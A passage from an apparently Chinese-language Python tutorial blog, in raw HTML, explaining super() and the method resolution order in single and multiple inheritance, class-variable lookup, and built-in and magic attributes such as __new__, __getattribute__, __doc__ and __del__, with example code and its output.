&#x27;__main__.Son1&#x27;&gt;, </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        &lt;class &#x27;__main__.Son2&#x27;&gt;, &lt;class &#x27;__main__.Parent&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">******多继承使用super().__init__发生的状态******</span><br><span class="line">(&lt;class &#x27;__main__.Grandson&#x27;&gt;, &lt;class &#x27;__main__.Son1&#x27;&gt;, &lt;class &#x27;__main__.Son2&#x27;&gt;, &lt;class &#x27;__main__.Parent&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line">Grandson的init开始被调用</span><br><span class="line">Son1的init开始被调用</span><br><span class="line">Son2的init开始被调用</span><br><span class="line">parent的init开始被调用</span><br><span class="line">parent的init结束被调用</span><br><span class="line">Son2的init结束被调用</span><br><span class="line">Son1的init结束被调用</span><br><span class="line">Grandson的init结束被调用</span><br><span class="line">姓名： grandson</span><br><span class="line">年龄： 12</span><br><span class="line">性别： 男</span><br><span class="line">******多继承使用super().__init__发生的状态******</span><br></pre></td></tr></table></figure><h3 id="上述两种调用父类的方法是有区别的"><a href="#上述两种调用父类的方法是有区别的" class="headerlink" title="上述两种调用父类的方法是有区别的"></a>上述两种调用父类的方法是有区别的</h3><ol><li>如果2个子类中都继承了父类，当在子类中通过父类名调用时，parent被执行了2次</li><li>如果2个子类中都继承了父类，当在子类中通过super调用时，parent被执行了1次</li></ol><h3 id="如果继承多个父类，super-指的是哪一个父类呢？如何确定调用顺序呢？"><a href="#如果继承多个父类，super-指的是哪一个父类呢？如何确定调用顺序呢？" class="headerlink" title="如果继承多个父类，super 指的是哪一个父类呢？如何确定调用顺序呢？"></a>如果继承多个父类，super 指的是哪一个父类呢？如何确定调用顺序呢？</h3><blockquote><p>[7. 深入面向对象 | #如果继承多个父类，super指的是哪一个父类呢？(11pmsleep.github.io)](<a href="https://11pmsleep.github.io/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/7">https://11pmsleep.github.io/Python全栈/Python核心编程/7</a>. 深入面向对象.html#如果继承多个父类，super指的是哪一个父类呢？)</p><p><a href="https://blog.csdn.net/qq_26442553/article/details/81775449">Python多继承与super使用详解_涤生大数据的博客-CSDN博客_python多继承</a></p></blockquote><blockquote><p>可以用类对象的方法查看继承的过程</p><p><code>__mro__</code>：</p><p>python 类有多继承特性，如果继承关系太复杂，很难看出会先调用那个属性或方法。</p><p>为了方便且快速地看清继承关系和顺序，可以用<code>__mro__</code>方法来获取这个类的调用顺序。</p></blockquote><h3 id="python关于多继承super传参的问题"><a href="#python关于多继承super传参的问题" class="headerlink" title="python关于多继承super传参的问题"></a>python关于多继承super传参的问题</h3><blockquote><p>python在多继承中使用super调用父类中的方法是怎么样传参的呢？需要一次性传递所有参数</p></blockquote><h2 id="单继承中的super"><a href="#单继承中的super" class="headerlink" title="单继承中的super"></a>单继承中的<code>super</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******单继承使用super().__init__发生的状态******&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init开始被调用&#x27;</span>)</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;parent的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son1</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init开始被调用&#x27;</span>)</span><br><span class="line">        self.age = age</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)  <span class="comment"># 单继承不能提供全部参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Son1的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grandson</span>(<span class="title class_ inherited__">Son1</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, gender</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init开始被调用&#x27;</span>)</span><br><span class="line">        self.gender = gender</span><br><span class="line">        <span class="built_in">super</span>().__init__(name, age)  <span class="comment"># 单继承不能提供全部参数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Grandson的init结束被调用&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gs = Grandson(<span class="string">&#x27;grandson&#x27;</span>, <span class="number">12</span>, <span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;姓名：&#x27;</span>, gs.name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;年龄：&#x27;</span>, gs.age)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;性别：&#x27;</span>, gs.gender)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;******单继承使用super().__init__发生的状态******\n\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">******单继承使用super().__init__发生的状态******</span><br><span class="line">Grandson的init开始被调用</span><br><span class="line">Son1的init开始被调用</span><br><span class="line">parent的init开始被调用</span><br><span class="line">parent的init结束被调用</span><br><span class="line">Son1的init结束被调用</span><br><span class="line">Grandson的init结束被调用</span><br><span class="line">姓名： grandson</span><br><span class="line">年龄： 12</span><br><span class="line">性别： 男</span><br><span class="line">******单继承使用super().__init__发生的状态******</span><br></pre></td></tr></table></figure><h2 id="简单总结-1"><a href="#简单总结-1" class="headerlink" title="简单总结"></a>简单总结</h2><ol><li><code>super().__init__</code>相对于<code>类名.__init__</code>，在单继承上用法基本无差</li><li>但在多继承上有区别，<code>super</code>方法能保证每个父类的方法<strong>只会执行一次</strong>，而使用类名的方法会导致方法被执行多次，具体看前面的输出结果</li><li>多继承时，使用<code>super</code>方法，对父类的传参数，由于<code>super</code>的算法导致的原因，必须把参数<strong>全部传递</strong>，否则会报错（先记住！！！一定是传递全部参数），并注意在父类中要添加不定长参数</li><li>单继承时，使用<code>super</code>方法，则不能全部传递，只能传父类方法所需的参数，否则会报错</li><li>多继承时，相对于使用类名.__init__方法，要把每个父类全部写一遍, 而使用super方法，只需写一句话便执行了全部父类的方法，这也是为何多继承需要全部传参的一个原因</li></ol><blockquote><p>super的话，写起来很爽，但维护起来很难受</p></blockquote><h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><p>以下代码将会输出什么？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child1</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child2</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(Parent.x, Child1.x, Child2.x)</span><br><span class="line">Child1.x = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(Parent.x, Child1.x, Child2.x)</span><br><span class="line">Parent.x = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(Parent.x, Child1.x, Child2.x)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1 1 1</span><br><span class="line">1 2 1</span><br><span class="line">3 2 3</span><br></pre></td></tr></table></figure><p>使你困惑或是惊奇的是关于最后一行的输出是 3 2 3 而不是 3 2 1。为什么改变了 Parent.x 的值还会改变 Child2.x 的值，但是同时 Child1.x 值却没有改变？</p><p>这个答案的关键是，在 Python 中，类变量在内部是作为字典处理的。如果一个变量的名字没有在当前类的字典中发现，将搜索祖先类（比如父类）直到被引用的变量名被找到（如果这个被引用的变量名既没有在自己所在的类又没有在祖先类中找到，会引发一个 AttributeError 异常 ）。</p><p>因此，在父类中设置 x &#x3D; 1 会使得类变量 x 在引用该类和其任何子类中的值为 1。这就是因为第一个 print 语句的输出是 1 1 1。</p><p>随后，如果任何它的子类重写了该值（例如，我们执行语句 Child1.x &#x3D; 2），然后，该值仅仅在子类中被改变。这就是为什么第二个 print 语句的输出是 1 2 1。</p><p>最后，如果该值在父类中被改变（例如，我们执行语句 Parent.x &#x3D; 3），这个改变会影响到任何未重写该值的子类当中的值（在这个示例中被影响的子类是 Child2）。这就是为什么第三个 print 输出是 3 2 3。</p><h1 id="内建属性"><a href="#内建属性" class="headerlink" title="内建属性"></a>内建属性</h1><h2 id="什么是内建属性"><a href="#什么是内建属性" class="headerlink" title="什么是内建属性"></a>什么是内建属性</h2><blockquote><p>往往是指我们在使用类时可以直接使用的那些功能，例如<code>__new__</code>、<code>__init__</code>等</p><p>除去类属性类方法、实例属性、实例方法之外的就是内建属性</p><p>在python中创建一个类，它不仅有我们自定义的属性和方法，还有与生俱来的一些属性和方法，我们叫它内建属性</p></blockquote><h3 id="新式类"><a href="#新式类" class="headerlink" title="新式类"></a>新式类</h3><p>Python3 中定义的类都是新式类的，无论是否写明一个类继承<code>object</code>，都会间接或直接继承<code>object</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Python3 类的内建属性和方法</p><blockquote><p>通过dir()查看类的属性和方法</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="built_in">dir</span>(Person)</span><br><span class="line"></span><br><span class="line">Out[<span class="number">2</span>]: </span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__delattr__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__dir__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__doc__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__eq__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__ge__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__gt__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__hash__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__init__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__le__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__lt__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__ne__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__new__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__reduce__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__reduce_ex__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__repr__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__sizeof__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__str__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__subclasshook__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__weakref__&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="旧式类"><a href="#旧式类" class="headerlink" title="旧式类"></a>旧式类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python2中无继承父类，称之经典类。Python3中已默认继承object</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.16</span> (default, Mar <span class="number">25</span> <span class="number">2021</span>, <span class="number">18</span>:<span class="number">52</span>:<span class="number">10</span>) </span><br><span class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">10.0</span><span class="number">.1</span> (clang-<span class="number">1001.0</span><span class="number">.37</span><span class="number">.14</span>)] on darwin</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(Person)</span><br><span class="line">[<span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h2 id="常用内建属性"><a href="#常用内建属性" class="headerlink" title="常用内建属性"></a>常用内建属性</h2><blockquote><p>内建属性一般是不建议修改，如果要修改那么尽量将整套的内建属性复写，否则容易出现错误</p></blockquote><table><thead><tr><th align="left">常用专有属性</th><th align="left">说明</th><th align="left">触发方式</th></tr></thead><tbody><tr><td align="left"><code>__init__</code></td><td align="left"><strong>(重要）</strong>构造初始化函数</td><td align="left">创建实例后,赋值时使用,在<code>__new__</code>后自动调用</td></tr><tr><td align="left"><code>__new__</code></td><td align="left"><strong>(重要）</strong>帮助类在内存开辟一个空间存放类的实例，创建对象时也需要开辟空间。开辟的空间用来存储相应内容。用来控制创建内存的数量。返回值为一片空间的地址，实例名指向该地址</td><td align="left">创建实例时使用，也可以重写该方法。典例是在单例模式情况下应用，创建的实例对象空间指向同一片区域(一般情况用不到，大部分用来更加精细的对内存空间进行操作时才会用到)</td></tr><tr><td align="left"><code>__class__</code></td><td align="left">实例所在的类</td><td align="left"><code>实例.__class__</code></td></tr><tr><td align="left"><code>__str__</code></td><td align="left">实例字符串表示,可读性，如果需要再print中输出自定义内容可以用此属性重写方法</td><td align="left">实例化对象的字符串表示（代表名字），面向用户，通过print输出实例化类的结果。<code>print(类实例)</code>如没实现，使用repr结果</td></tr><tr><td align="left"><code>__repr__</code></td><td align="left">实例字符串表示,准确性</td><td align="left">实例化对象的字符串表示，面向开发者的。类实例 回车 或者 <code>print(repr(类实例))</code>（基本上用不到）</td></tr><tr><td align="left"><code>__del__</code></td><td align="left">析构（对象被删除前做清理工作）</td><td align="left"><code>del 实例</code>后，如果对象引用计数为0，则自动调用</td></tr><tr><td align="left"><code>__dict__</code></td><td align="left"><strong>(重要）</strong>输出类和对象的属性及方法</td><td align="left"><code>vars(实例.__dict__)</code></td></tr><tr><td align="left"><code>__doc__</code></td><td align="left">类文档,类的描述信息。（子类不继承）</td><td align="left"><code>help(类或实例)</code></td></tr><tr><td align="left"><code>__getattribute__</code></td><td align="left"><strong>(重要）</strong>属性访问拦截器</td><td align="left">访问实例属性时</td></tr><tr><td align="left"><code>__bases__</code></td><td align="left">类的所有父类构成元素</td><td align="left"><code>类名.__bases__</code>（基本上用不到）</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name, self.age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = Test(<span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看类对象属性与方法</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(Test))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(test))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(p.__class__)</span><br></pre></td></tr></table></figure><h2 id="new-属性"><a href="#new-属性" class="headerlink" title="__new__属性"></a><code>__new__</code>属性</h2><p><code>__new__()</code> 是在新式类中新出现的方法，它作用在构造方法建造实例之前，可以这么理解，在 Python 中存在于类里面的构造方法 <code>__init__()</code> 负责将类的实例化，而在 <code>__init__()</code> 启动之前，<code>__new__()</code> 决定是否要使用该 <code>__init__()</code> 方法，因为<code>__new__()</code> 可以调用其他类的构造方法或者直接返回别的对象来作为本类的实例。</p><p>如果将类比喻为工厂，那么<code>__init__()</code>方法则是该工厂的生产工人，<code>__init__()</code>方法接受的初始化参数则是生产所需原料，<code>__init__()</code>方法会按照方法中的语句负责将原料加工成实例以供工厂出货。而__new__()则是生产部经理，<code>__new__()</code>方法可以决定是否将原料提供给该生产部工人，同时它还决定着出货产品是否为该生产部的产品，因为这名经理可以借该工厂的名义向客户出售完全不是该工厂的产品。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">关于python类中的__new__方法：</span></span><br><span class="line"><span class="string">    帮助类在内存中去开辟一个空间</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">python解释器会在内存中创建一个空间来存储类对象</span></span><br><span class="line"><span class="string">如果需要对当前这个类进行实例化的话 则也需要创建一个空间来存储实例对象</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    如果你创建了三个实例对象</span></span><br><span class="line"><span class="string">        则在内存中创建三个空间类存储这些对象</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    在实例化类时，想要在内存中只开辟一个空间来存储实例对象</span></span><br><span class="line"><span class="string">        __new__</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    用来控制创建内存的数量的</span></span><br><span class="line"><span class="string">        开发模式</span></span><br><span class="line"><span class="string">            单例模式</span></span><br><span class="line"><span class="string">                你对这个类进行了多次的实例化</span></span><br><span class="line"><span class="string">                    但是只会占用一个内存空间</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    第一次创建实例对象时，占用一个内存空间</span></span><br><span class="line"><span class="string">                    第二次创建实例对象时， 将上一次的对象的引用拿过来进行重新赋值</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    test()</span></span><br><span class="line"><span class="string">                    test2()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>[<a href="https://www.cnblogs.com/ifantastic/p/3175735.html">Python] Python 之 <strong>new</strong>() 方法与实例化 - iFantasticMe - 博客园 (cnblogs.com)</a></p><p><a href="https://www.pythontab.com/html/2018/pythonjichu_1106/1374.html">Python 中__new__方法详解及使用 - Python基础教程|Python教程|Python入门 - PythonTab中文网</a></p><p><a href="https://zhuanlan.zhihu.com/p/35943253">Python面试之理解__new__和__init__的区别 - 知乎 (zhihu.com)</a></p></blockquote><h2 id="getattribute-属性"><a href="#getattribute-属性" class="headerlink" title="__getattribute__属性"></a><code>__getattribute__</code>属性</h2><blockquote><p>在对象访问属性的时候，会自动调用<code>__getattribute__</code>方法，<code>__getattribute__</code>可以重写，对用户的输入属性进行改写输出以及过滤拦截。</p><p>比如说符合某些属性就可以pass，但如果不符合条件就会被拦截过来吧。</p><p>在不对实例属性修改的情况下，如果设置判断条件，返回不同的属性</p><p>下面这个例子应该可以理解：</p></blockquote><p><code>__getattribute__</code>功能很强大：能够完成属性访问时进行拦截</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tuling</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sub</span>):</span><br><span class="line">        self.sub1 = sub</span><br><span class="line">        self.sub2 = <span class="string">&#x27;java&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 声明一个属性拦截器</span></span><br><span class="line">    <span class="comment"># 属性访问时拦截器，打log</span></span><br><span class="line">    <span class="comment"># __getattribute__会自动添加两个参数，self不用多讲，item是获取到你传入属性的名称</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="keyword">if</span> item == <span class="string">&#x27;sub1&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;现在访问的是sub1属性...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;c++&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># 测试时注释掉这2行，将找不到subject2</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">object</span>.__getattribute__(self, item)<span class="comment">#调用的父类object的__getattribute__方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户传入的一个属性我想在运行时更改这个属性的值</span></span><br><span class="line">t = Tuling(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.sub1)</span><br><span class="line"><span class="built_in">print</span>(t.sub2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我现在想要或sub2的值  到底如何获取的？</span></span><br><span class="line"><span class="comment"># print(t.sub2)  # 实例对象获取实例属性需要通过__getattribute__进行获取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub1</span></span><br><span class="line"><span class="string">    python</span></span><br><span class="line"><span class="string">sub2</span></span><br><span class="line"><span class="string">    java</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">在不对实例属性进行修改的情况下 让当前sub1返回c++</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">现在访问的是sub1属性...</span><br><span class="line">c++</span><br><span class="line">java</span><br></pre></td></tr></table></figure><h2 id="getattribute-注意事项"><a href="#getattribute-注意事项" class="headerlink" title="__getattribute__ 注意事项"></a><code>__getattribute__</code> 注意事项</h2><blockquote><p>注意：以后不要在<code>__getattribute__</code>方法中调用self.xxxx，直接用父类名</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---test---&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> obj.startswith(<span class="string">&quot;a&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hahha&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.test</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;heihei&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.a)  <span class="comment"># 返回hahha</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.b)  <span class="comment"># 会让程序死掉</span></span><br><span class="line"><span class="comment"># 原因是：当t.b执行时，会调用Person类中定义的__getattribute__方法，但是在这个方法的执行过程中</span></span><br><span class="line"><span class="comment"># if条件不满足，所以 程序执行else里面的代码，即return self.test  问题就在这，因为return 需要把</span></span><br><span class="line"><span class="comment"># self.test的值返回，那么首先要获取self.test的值，因为self此时就是p这个对象，所以self.test就是</span></span><br><span class="line"><span class="comment"># p.test 此时要获取p这个对象的test属性，那么就会跳转到__getattribute__方法去执行，即此时产</span></span><br><span class="line"><span class="comment"># 生了递归调用，由于这个递归过程中 没有判断什么时候退出，所以这个程序会永无休止的运行下去，又因为</span></span><br><span class="line"><span class="comment"># 每次调用函数，就需要保存一些数据，那么随着调用的次数越来越多，最终内存吃光，所以程序 崩溃</span></span><br></pre></td></tr></table></figure><p>如果上面例子看不懂 看下面这个简单的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, item</span>):</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">object</span>.__getattribute__(self, item)</span><br><span class="line">    <span class="comment">#如果这个地方是return self.name，就会进入死循环</span></span><br><span class="line"></span><br><span class="line">test = Test(<span class="string">&#x27;安娜&#x27;</span>, <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(test.name)</span><br><span class="line"><span class="built_in">print</span>(test.age)</span><br></pre></td></tr></table></figure><h1 id="魔法属性"><a href="#魔法属性" class="headerlink" title="魔法属性"></a>魔法属性</h1><p>无论人或事物往往都有不按套路出牌的情况，Python的类属性也是如此，存在着一些具有特殊含义的属性，详情如下</p><h2 id="doc"><a href="#doc" class="headerlink" title="__doc__"></a><code>__doc__</code></h2><ul><li>表示类的描述信息</li></ul><blockquote><p>在不知道一个类或者一个包是干森魔的时候，可以使用doc查看说明</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 描述类信息，这是一个类的简单描述 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Foo.__doc__)</span><br><span class="line"><span class="comment">#  输出：类的描述信息</span></span><br></pre></td></tr></table></figure><h2 id="module-和-class"><a href="#module-和-class" class="headerlink" title="__module__和__class__"></a><code>__module__</code>和<code>__class__</code></h2><ul><li><code>__module__</code> 表示当前操作的对象在哪个模块</li><li><code>__class__</code> 表示当前操作的对象的类是什么</li></ul><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&#x27;安娜&#x27;</span></span><br></pre></td></tr></table></figure><p><code>main.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test <span class="keyword">import</span> Person</span><br><span class="line"></span><br><span class="line">obj = Person()</span><br><span class="line"><span class="built_in">print</span>(obj.__module__)  <span class="comment"># 输出 test 即：输出模块</span></span><br><span class="line"><span class="built_in">print</span>(obj.__class__)  <span class="comment"># 输出 test.Person 即：输出类</span></span><br></pre></td></tr></table></figure><h2 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h2><ul><li>初始化方法，通过类创建对象时，自动触发执行</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = <span class="number">18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = Person(<span class="string">&#x27;安娜&#x27;</span>)  <span class="comment"># 自动执行类中的 __init__ 方法</span></span><br></pre></td></tr></table></figure><h2 id="del"><a href="#del" class="headerlink" title="__del__"></a><code>__del__</code></h2><ul><li>当对象在内存中被释放之前，自动触发执行</li></ul><p>注：此方法一般无须定义，因为Python是一门高级语言，程序员在使用时无需关心内存的分配和释放，因为此工作都是交给Python解释器来执行，所以<code>__del__</code>的调用是由解释器在进行垃圾回收前 自动触发，执行一些完善工作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span 